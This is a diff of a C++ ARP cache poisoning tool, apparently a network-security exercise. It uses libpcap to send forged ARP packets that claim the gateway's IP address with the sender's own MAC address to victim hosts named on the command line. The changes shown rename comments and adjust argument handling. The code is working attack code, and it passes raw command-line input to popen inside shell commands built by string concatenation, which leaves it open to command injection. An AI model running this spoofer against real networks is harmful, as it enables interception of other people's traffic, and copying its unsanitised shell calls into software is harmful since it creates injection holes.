@@ -5,8 +5,6 @@
 #include <iostream>
 #include <fstream>
 #include <sstream>
-//#include <string>
-//#include <vector>
 #include <algorithm>
 #include <cstdio>
 #include <cstring>
@@ -31,7 +29,6 @@ string cmd(string command) {
     std::string result;
     char buffer[128];
 
-    // 커맨드 실행 후 결과를 읽기 위해 popen 사용
     FILE* pipe = popen(command.c_str(), "r");
     if (!pipe) {
         return "Error: popen failed!";
@@ -45,7 +42,6 @@ string cmd(string command) {
 
     pclose(pipe);
 
-    // 개행 문자 제거
     if (!result.empty() && result.back() == '\n') {
         result.pop_back();
     }
@@ -64,7 +60,7 @@ string getMymac(string inter) {
         auto pos = line.find("ether ");
         if (pos != std::string::npos) {
             std::string macAddress = line.substr(pos + 6, 17);
-            macAddress.erase(std::remove(macAddress.begin(), macAddress.end(), ':'), macAddress.end());
+            //macAddress.erase(std::remove(macAddress.begin(), macAddress.end(), ':'), macAddress.end());
             return macAddress;
         }
 
@@ -73,8 +69,7 @@ string getMymac(string inter) {
 }
 
 string getVmac(string vip) {
-    string command = "arp -n " + vip + " | awk '/" + vip + "/ {print $4}' ";
-    //printf("%s", command);
+    string command = "arp -n " + vip + " | awk '/" + vip + "/ {print $3}' ";
     string output = cmd(command);
     return output;
 }
@@ -82,14 +77,8 @@ string getVmac(string vip) {
 
 
 int main(int argc, char* argv[]) {
-    if (argc <= 2) {
-        string str = getMymac("eth0");
-        cout << str << endl;
-
-	string cm="sudo arping -c 5 "+(string)argv[1];
-	cmd(cm);
-	string str2 = getVmac(argv[1]);
-	cout<<str2<<endl;
+    if (argc < 4) {
+        cout << "put all interface & address"<<endl;
 	return 0;
     }
 
@@ -106,13 +95,14 @@ int main(int argc, char* argv[]) {
 
     for (int i = 2; i < argc; i=i+2) {
         EthArpPacket packet;
+
 	string arpUp = "sudo arping -c 5 " + (string)argv[i];
-	cout<<arpUp<<endl;
         cmd(arpUp);
+
         string vmac = getVmac(argv[i]); //victim mac
 
-        packet.eth_.dmac_ = Mac(vmac); //빅팀맥
-        packet.eth_.smac_ = Mac(mymac); //내맥
+        packet.eth_.dmac_ = Mac(vmac);
+        packet.eth_.smac_ = Mac(mymac);
         packet.eth_.type_ = htons(EthHdr::Arp);
 
         packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -120,10 +110,10 @@ int main(int argc, char* argv[]) {
         packet.arp_.hln_ = Mac::SIZE;
         packet.arp_.pln_ = Ip::SIZE;
         packet.arp_.op_ = htons(ArpHdr::Request);
-        packet.arp_.smac_ = Mac(mymac); //내맥
-        packet.arp_.sip_ = htonl(Ip(argv[i+1])); //게이트웨이ip
-        packet.arp_.tmac_ = Mac(vmac); //샌더맥=빅팀
-        packet.arp_.tip_ = htonl(Ip(argv[i])); //샌더ip=빅팀
+        packet.arp_.smac_ = Mac(mymac);
+        packet.arp_.sip_ = htonl(Ip(argv[i+1])); //gateway ip
+        packet.arp_.tmac_ = Mac(vmac);
+        packet.arp_.tip_ = htonl(Ip(argv[i])); //victim ip
 
         int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
         if (res != 0) {
